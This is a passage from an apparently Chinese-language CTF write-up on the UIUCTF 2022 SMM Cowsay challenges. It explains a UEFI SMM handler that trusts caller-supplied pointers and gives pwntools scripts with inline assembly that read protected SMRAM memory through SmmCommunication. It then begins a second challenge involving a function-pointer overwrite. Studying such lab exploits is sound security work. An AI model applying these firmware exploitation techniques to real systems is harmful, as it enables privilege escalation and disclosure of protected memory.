UEFI 驱动程序可以通过此“SmmCommunication”协议与注册了适当处理程序的 SMM UEFI 驱动程序进行通信，并且数据通过指向 <code>EFI_SMM_COMMUNICATE_HEADER</code> 结构的指针传递：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  EFI_GUID HeaderGuid;</span><br><span class="line">  UINTN MessageLength;</span><br><span class="line">  UINT8 Data[ANYSIZE_ARRAY];</span><br><span class="line">&#125; EFI_SMM_COMMUNICATE_HEADER;</span><br></pre></td></tr></table></figure><p>注意到传递的消息实质上一个指针</p><p><code>*(CONST CHAR16 **)&amp;Buffer-&gt;Data = Message;</code></p><p>在这种情况下，发送的消息只是一个指针，它按原样复制到 <code>-&gt;Data</code> 数组成员中。换句话说， <code>Binexec.efi</code> 发送一个指向要通过 <code>mSmmCommunication-&gt;Communicate</code> 打印到 <code>SmmCowsay.efi</code> 的字符串的指针。如果我们看一下 <code>SmmCowsay.efi</code> 处理指针，我们可以看到它没有以任何特殊方式处理。它只是按原样传递给打印函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">EFI_STATUS</span><br><span class="line">EFIAPI</span><br><span class="line"><span class="title function_">SmmCowsayHandler</span> <span class="params">(</span></span><br><span class="line"><span class="params">    IN EFI_HANDLE  DispatchHandle,</span></span><br><span class="line"><span class="params">    IN CONST VOID  *Context         OPTIONAL,</span></span><br><span class="line"><span class="params">    IN OUT VOID    *CommBuffer      OPTIONAL,</span></span><br><span class="line"><span class="params">    IN OUT UINTN   *CommBufferSize  OPTIONAL</span></span><br><span class="line"><span class="params">    )</span></span><br><span class="line">&#123;</span><br><span class="line">    DEBUG ((DEBUG_INFO, <span class="string">&quot;SmmCowsay SmmCowsayHandler Enter\n&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!CommBuffer || !CommBufferSize || *CommBufferSize &lt; <span class="keyword">sizeof</span>(CHAR16 *))</span><br><span class="line">        <span class="keyword">return</span> EFI_SUCCESS;</span><br><span class="line"></span><br><span class="line">    Cowsay(*(CONST CHAR16 **)CommBuffer); <span class="comment">// &lt;== pointer passed *as is* here</span></span><br><span class="line"></span><br><span class="line">    DEBUG ((DEBUG_INFO, <span class="string">&quot;SmmCowsay SmmCowsayHandler Exit\n&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> EFI_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这意味着我们可以将任意指针传递给 <code>SmmCowsay</code> 驱动程序，它会很乐意为我们读取给定地址处的内存，并将其显示在控制台上，就像它是一个以 NUL 结尾的 <code>CHAR16</code> 的 <code>EFI_SMM_COMMUNICATE_HEADER</code> ，并通过 <code>mSmmCommunication-&gt;Communicate</code> 将其传递给 SMM 驱动程序，我们可以将其获取为我们打印旗帜！</p><p>但是我们如何获得这个“SmmCommunication”协议来调用它的 <code>-&gt;Communicate()</code> 方法呢？看一下 <code>Binexec.efi</code> 中的代码， <code>mSmmCommunication</code> 只是将正确的 GUID 传递给 <code>BootServices-&gt;LocateProtocol()</code> 获得的指针，如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Status = gBS-&gt;LocateProtocol(</span><br><span class="line">    &amp;gEfiSmmCommunicationProtocolGuid,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    (VOID **)&amp;mSmmCommunication</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>那么我们现在需要做的就是想办法调用cowsay,并将flag的地址作为参数传送</p><p>我们需要得到 <code>SystemTable-&gt;BootServices-&gt;LocateProtocol</code> 。理论上，由于 EDK2 没有应用 ASLR，所有地址在我们的工作环境（本地和远程）中都是固定的，因此我们可以获取我们需要的任何函数的地址并直接调用</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="Step-1-get-LocateProtocol"><a href="#Step-1-get-LocateProtocol" class="headerlink" title="Step 1: get LocateProtocol"></a>Step 1: get LocateProtocol</h4><p><code>LocateProtocol</code> 函数在 <code>BootServices</code> 表 ( <code>gBS</code> ) 中提供，实际上我们在 <code>SystemTable</code> 中有一个指针。我们知道 <code>SystemTable</code> 的地址，因为程序将其打印到控制台了,但实际上因为edk2不支持任何aslr技术,所以哪怕不给,也能够调试获得</p><p>我们看LocateProtocol函数,其可以根据给定guid定位到protocol或者服务的地址,并将其存储在r8指向的空间(返回一个指向protocol的指针)</p><blockquote><p><strong>Summary</strong></p><p>Returns the first protocol instance that matches the given protocol.</p><p><strong>Prototype</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">typedef</span><br><span class="line">EFI_STATUS</span><br><span class="line">(EFIAPI *EFI_LOCATE_PROTOCOL) (</span><br><span class="line">  IN EFI_GUID                            *Protocol,</span><br><span class="line">  IN VOID                                *Registration OPTIONAL,</span><br><span class="line">  OUT VOID                               **Interface</span><br><span class="line"> );</span><br></pre></td></tr></table></figure><p><strong>Parameters</strong></p><ul><li><p>Protocol</p><p>Provides the protocol to search for.</p></li><li><p>Registration</p><p>Optional registration key returned from <a href="https://uefi.org/specs/UEFI/2.10/07_Services_Boot_Services.html?highlight=locateprotocol#efi-boot-services-registerprotocolnotify">EFI_BOOT_SERVICES.RegisterProtocolNotify()</a> . If <em>Registration</em> is NULL, then it is ignored.</p></li><li><p>Interface</p><p>On return, a pointer to the first interface that matches <em>Protocol</em> and <em>Registration</em>.</p></li></ul><p><strong>Description</strong></p><p>The <strong>LocateProtocol</strong>() function finds the first device handle that support <em>Protocol</em>, and returns a pointer to the protocol interface from that handle in <em>Interface</em>. If no protocol instances are found, then <em>Interface</em> is set to NULL.</p><p>If <em>Interface</em> is NULL, then EFI_INVALID_PARAMETER is returned.</p><p>If <em>Protocol</em> is NULL, then EFI_INVALID_PARAMETER is returned.</p><p>If <em>Registration</em> is NULL, and there are no handles in the handle database that support <em>Protocol</em>, then EFI_NOT_FOUND is returned.</p><p>If <em>Registration</em> is not NULL, and there are no new handles for <em>Registration</em>, then EFI_NOT_FOUND is returned.</p><p><strong>Status Codes Returned</strong></p><div class="table-container"><table><thead><tr><th>EFI_SUCCESS</th><th>A protocol instance matching <em>Protocol</em> was found and returned in <em>Interface</em>.</th></tr></thead><tbody><tr><td>EFI_INVALID_PARAMETER</td><td><em>Interface</em> is NULL. <em>Protocol</em> is NULL.</td></tr><tr><td>EFI_NOT_FOUND</td><td>No protocol instances were found that match Protocol and <em>Registration</em>.</td></tr></tbody></table></div></blockquote><p>我们首先通过几个简单的mov获得protocol的地址</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;system_table&#125;</span></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rax + 96]  /* SystemTable-&gt;BootServices */</span></span><br><span class="line"><span class="string">    mov rbx, qword ptr [rax + 64]  /* BootServices-&gt;AllocatePool */</span></span><br><span class="line"><span class="string">    mov rcx, qword ptr [rax + 320] /* BootServices-&gt;LocateProtocol */</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">conn.sendline(code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.recvuntil(<span class="string">b&#x27;RBX: 0x&#x27;</span>)</span><br><span class="line">AllocatePool = <span class="built_in">int</span>(conn.recvn(<span class="number">16</span>), <span class="number">16</span>) <span class="comment"># useful for later</span></span><br><span class="line">conn.recvuntil(<span class="string">b&#x27;RCX: 0x&#x27;</span>)</span><br><span class="line">LocateProtocol = <span class="built_in">int</span>(conn.recvn(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;BootServices-&gt;AllocatePool   @ 0x%x&#x27;</span>, AllocatePool)</span><br><span class="line">log.success(<span class="string">&#x27;BootServices-&gt;LocateProtocol @ 0x%x&#x27;</span>, LocateProtocol)</span><br></pre></td></tr></table></figure><p>可以看到我们还获取了一个指针<code>BootServices-&gt;AllocatePool</code>,这个之后再说</p><h4 id="Step-2-get-mSmmCommunication"><a href="#Step-2-get-mSmmCommunication" class="headerlink" title="Step 2: get mSmmCommunication"></a>Step 2: get mSmmCommunication</h4><p>现在为了定位 <code>mSmmCommunication</code> 我们需要将一个指向协议 GUID 的指针传递给 <code>LocateProtocol</code> ，以及一个指向应存储结果指针的位置的指针。我们已经有一个可用的 RWX 内存区域（编写 shellcode 的区域），所以我们使用它。</p><p>此外,EDK2 的补丁 <code>0005-PiSmmCpuDxeSmm-Open-up-all-the-page-table-access-res.patch</code> 将页表的所有条目设置为 RWX : )</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Taken from EDK2 source code (or opening Binexec.efi in a disassembler)</span></span><br><span class="line">gEfiSmmCommunicationProtocolGuid = <span class="number">0x32c3c5ac65db949d4cbd9dc6c68ed8e2</span></span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* LocateProtocol(gEfiSmmCommunicationProtocolGuid, NULL, &amp;protocol) */</span></span><br><span class="line"><span class="string">    lea rcx, qword ptr [rip + guid]</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    lea r8, qword ptr [rip + protocol]</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;LocateProtocol&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rip + protocol] /* mSmmCommunication */</span></span><br><span class="line"><span class="string">    mov rbx, qword ptr [rax]            /* mSmmCommunication-&gt;Communicate */</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">guid:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;gEfiSmmCommunicationProtocolGuid&#125;</span></span></span><br><span class="line"><span class="string">protocol:</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">conn.sendline(code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.recvuntil(<span class="string">b&#x27;RAX: 0x&#x27;</span>)</span><br><span class="line">mSmmCommunication = <span class="built_in">int</span>(conn.recvn(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">conn.recvuntil(<span class="string">b&#x27;RBX: 0x&#x27;</span>)</span><br><span class="line">Communicate = <span class="built_in">int</span>(conn.recvn(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;mSmmCommunication              @ 0x%x&#x27;</span>, mSmmCommunication)</span><br><span class="line">log.success(<span class="string">&#x27;mSmmCommunication-&gt;Communicate @ 0x%x&#x27;</span>, Communicate)</span><br></pre></td></tr></table></figure><h4 id="Step-3-getflag"><a href="#Step-3-getflag" class="headerlink" title="Step 3: getflag"></a>Step 3: getflag</h4><p>现在，我们可以为 <code>SmmCowsay</code> 制作一条消息，其中包含指向标志的指针，并让它通过使用正确的参数调用 <code>mSmmCommunication-&gt;Communicate</code> 来为我们打印它。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Taken from 0003-SmmCowsay-Vulnerable-Cowsay.patch</span></span><br><span class="line">gEfiSmmCowsayCommunicationGuid = <span class="number">0xf79265547535a8b54d102c839a75cf12</span></span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* Communicate(mSmmCommunication, &amp;buffer, NULL) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;mSmmCommunication&#125;</span></span></span><br><span class="line"><span class="string">    lea rdx, qword ptr [rip + buffer]</span></span><br><span class="line"><span class="string">    xor r8, r8</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;Communicate&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">buffer:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;gEfiSmmCowsayCommunicationGuid&#125;</span> /* Buffer-&gt;HeaderGuid */</span></span><br><span class="line"><span class="string">    .quad 8                                /* Buffer-&gt;MessageLength */</span></span><br><span class="line"><span class="string">    .quad 0x44440000                       /* Buffer-&gt;Data */</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">conn.sendline(code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Check output to see if things work</span></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><p>看起来一切都完美了,但实际上这个脚本并不能成功跑通</p><p><code>RAX  - 800000000000000F, RCX - 00000000000000B2, RDX - 00000000000000B2</code></p><p>返回值RAX是<code>800000000000000F</code>,通过UEFI的状态码表<a href="https://uefi.org/specs/UEFI/2.10/Apx_D_Status_Codes.html"> Status Codes — UEFI Specification 2.10 documentation</a>,我们可以得知这代表EFI_ACCESS_DENIED</p><p>尽管出题人明确添加了 EDK2 补丁以将 SMM 页表 ( <code>0005-PiSmmCpuDxeSmm-Open-up-all-the-page-table-access-res.patch</code> ) 中的所有内存标记为 RWX，但仍然对 SMM 通信执行健全性检查正如我们在 <a href="https://github.com/tianocore/edk2/blob/7c0ad2c33810ead45b7919f8f8d0e282dae52e71/MdePkg/Library/SmmMemLib/SmmMemLib.c#L163">EDK2 源代码</a>中看到的那样，<strong>不允许communicate()函数的第二个参数缓冲区存在于不受信任或无效的内存区域（如我们的 shellcode 中使用的内存区域）</strong></p><p>不过当我们查看上面 <code>Binexec.efi</code> 的代码，在 <code>Cowsay()</code> 函数中， <code>EFI_SMM_COMMUNICATE_HEADER</code> 实际上是使用库函数 <code>AllocateRuntimeZeroPool()</code> 分配的。</p><p>这个函数同样存在于<code>BootServices</code>，但可以使用 <code>BootServices-&gt;AllocatePool()</code> 或 <code>BootServices-&gt;AllocatePages()</code> 指定我们要分配的内存“类型”来分配内存。我们想要的 <code>EFI_MEMORY_TYPE</code> 是类型 <code>EfiRuntimeServicesData</code> ，可以从 SMM 访问它。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">EfiRuntimeServicesData = <span class="number">6</span></span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* AllocatePool(EfiRuntimeServicesData, 0x1000, &amp;buffer) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;EfiRuntimeServicesData&#125;</span></span></span><br><span class="line"><span class="string">    mov rdx, 0x1000</span></span><br><span class="line"><span class="string">    lea r8, qword ptr [rip + buffer]</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;AllocatePool&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rip + buffer]</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">buffer:</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">conn.sendline(code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.recvuntil(<span class="string">b&#x27;RAX: 0x&#x27;</span>)</span><br><span class="line">buffer = <span class="built_in">int</span>(conn.recvn(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&#x27;Allocated buffer @ 0x%x&#x27;</span>, buffer)</span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* Copy data into allocated buffer */</span></span><br><span class="line"><span class="string">    lea rsi, qword ptr [rip + data]</span></span><br><span class="line"><span class="string">    mov rdi, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    mov rcx, 0x20</span></span><br><span class="line"><span class="string">    cld</span></span><br><span class="line"><span class="string">    rep movsb</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Communicate(mSmmCommunication, buffer, NULL) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;mSmmCommunication&#125;</span></span></span><br><span class="line"><span class="string">    mov rdx, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    xor r8, r8</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;Communicate&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">data:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;gEfiSmmCowsayCommunicationGuid&#125;</span> /* Buffer-&gt;HeaderGuid */</span></span><br><span class="line"><span class="string">    .quad 8                                /* Buffer-&gt;MessageLength */</span></span><br><span class="line"><span class="string">    .quad 0x44440000                       /* Buffer-&gt;Data */</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.sendline(code.<span class="built_in">hex</span>().encode())</span><br><span class="line">conn.sendline(<span class="string">b&#x27;done&#x27;</span>)</span><br></pre></td></tr></table></figure><p>最后还有一个问题</p><p><code>IN CONST CHAR16 *Message</code></p><p>cowsay函数中调用的信息是UTF-16的,所以flag之会打印一半</p><p>不过将data中的0x44440000加上1即可,然后拼接一下</p><h2 id="uictf2022-cowsay2"><a href="#uictf2022-cowsay2" class="headerlink" title="uictf2022-cowsay2"></a>uictf2022-cowsay2</h2><p><strong>learn rop</strong></p><h3 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h3><p>这个cowsay总共有三题都做一下</p><p>题目描述</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">We asked that engineer to fix the issue, but I think he may have left a backdoor disguised as debugging code.</span><br></pre></td></tr></table></figure><p>题目环境与之前基本一样,但 <code>SmmCowsay.efi</code> 驱动程序的代码已更改。此外，我们不再拥有全局 RWX 内存，因为第五个 EDK2 补丁 ( <code>0005-PiSmmCpuDxeSmm-Protect-flag-addresses.patch</code> ) 现在不会解锁页表条目权限，而是显式地将包含该标志的内存区域设置为读保护！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SmmSetMemoryAttributes (</span><br><span class="line">  <span class="number">0x44440000</span>,</span><br><span class="line">  EFI_PAGES_TO_SIZE(<span class="number">1</span>),</span><br><span class="line">  EFI_MEMORY_RP<span class="comment">//read protect</span></span><br><span class="line">  );</span><br></pre></td></tr></table></figure><p>这意味着flag不可读了</p><p>提交消息中也给出了提示：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">From: YiFei Zhu &lt;zhuyifei@google.com&gt;</span><br><span class="line">Date: Mon, 28 Mar 2022 17:55:14 -0700</span><br><span class="line">Subject: [PATCH 5/8] PiSmmCpuDxeSmm: Protect flag addresses</span><br><span class="line"></span><br><span class="line">So attacker must disable paging or overwrite page table entries</span><br><span class="line">(which would require disabling write protection in cr0... so, the</span><br><span class="line">latter is redundant to former)</span><br></pre></td></tr></table></figure><p>EDK2 SMI 处理程序所做的第一件事是设置 4 级页表并启用 64 位长模式，因此 SMM 代码在带有页表的 64 位模式下运行。</p><p>页表中存储的虚拟地址与物理地址1:1对应，因此页表本身仅作为管理不同内存区域权限的一种方式（例如，不包含代码的页的页表项将具有NX 位设置）。标志页（ <code>0x44440000</code> ）被标记为“读保护”，这仅意味着相应的页表条目将清除当前位，因此任何访问都将导致页错误。</p><p>之前binexec的cowsay数据使用指针传输</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">+  Buffer-&gt;HeaderGuid = gEfiSmmCowsayCommunicationGuid;</span><br><span class="line">+  Buffer-&gt;MessageLength = MessageLen;</span><br><span class="line">+  CopyMem(Buffer-&gt;Data, Message, MessageLen);</span><br></pre></td></tr></table></figure><p>但现在直接使用数据传输</p><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>让我们看看 <code>SmmCowsay.efi</code> 的更新代码。现在通讯情况如何？我们有一个新的 <code>mDebugData</code> 结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  CHAR16 Message[<span class="number">200</span>];</span><br><span class="line">  VOID <span class="title function_">EFIAPI</span> <span class="params">(* <span class="keyword">volatile</span> CowsayFunc)</span><span class="params">(IN CONST CHAR16 *Message, IN UINTN MessageLen)</span>;</span><br><span class="line">  BOOLEAN <span class="keyword">volatile</span> Icebp;</span><br><span class="line">  UINT64 <span class="keyword">volatile</span> Canary;</span><br><span class="line">&#125; mDebugData;</span><br></pre></td></tr></table></figure><p>该结构保存一个 <code>-&gt;CowsayFunc</code> 函数指针，该指针在驱动程序初始化时设置：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mDebugData.CowsayFunc = Cowsay;</span><br></pre></td></tr></table></figure><p>SMM处理程序代码在接收到消息时使用 <code>mDebugData</code> 结构，如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">EFI_STATUS</span><br><span class="line">EFIAPI</span><br><span class="line"><span class="title function_">SmmCowsayHandler</span> <span class="params">(</span></span><br><span class="line"><span class="params">  IN EFI_HANDLE  DispatchHandle,</span></span><br><span class="line"><span class="params">  IN CONST VOID  *Context         OPTIONAL,</span></span><br><span class="line"><span class="params">  IN OUT VOID    *CommBuffer      OPTIONAL,</span></span><br><span class="line"><span class="params">  IN OUT UINTN   *CommBufferSize  OPTIONAL</span></span><br><span class="line"><span class="params">  )</span></span><br><span class="line">&#123;</span><br><span class="line">  EFI_STATUS Status;</span><br><span class="line">  UINTN TempCommBufferSize;</span><br><span class="line">  UINT64 Canary;</span><br><span class="line"></span><br><span class="line">  DEBUG ((DEBUG_INFO, <span class="string">&quot;SmmCowsay SmmCowsayHandler Enter\n&quot;</span>));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!CommBuffer || !CommBufferSize)</span><br><span class="line">    <span class="keyword">return</span> EFI_SUCCESS;</span><br><span class="line"></span><br><span class="line">  TempCommBufferSize = *CommBufferSize;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ... irrelevant code ...</span></span><br><span class="line"></span><br><span class="line">  Status = SmmCopyMemToSmram(mDebugData.Message, CommBuffer, TempCommBufferSize);</span><br><span class="line">  <span class="keyword">if</span> (EFI_ERROR(Status))</span><br><span class="line">    <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ... irrelevant code ...</span></span><br><span class="line"></span><br><span class="line">  SetMem(mDebugData.Message, <span class="keyword">sizeof</span>(mDebugData.Message), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  mDebugData.CowsayFunc(CommBuffer, TempCommBufferSize);</span><br><span 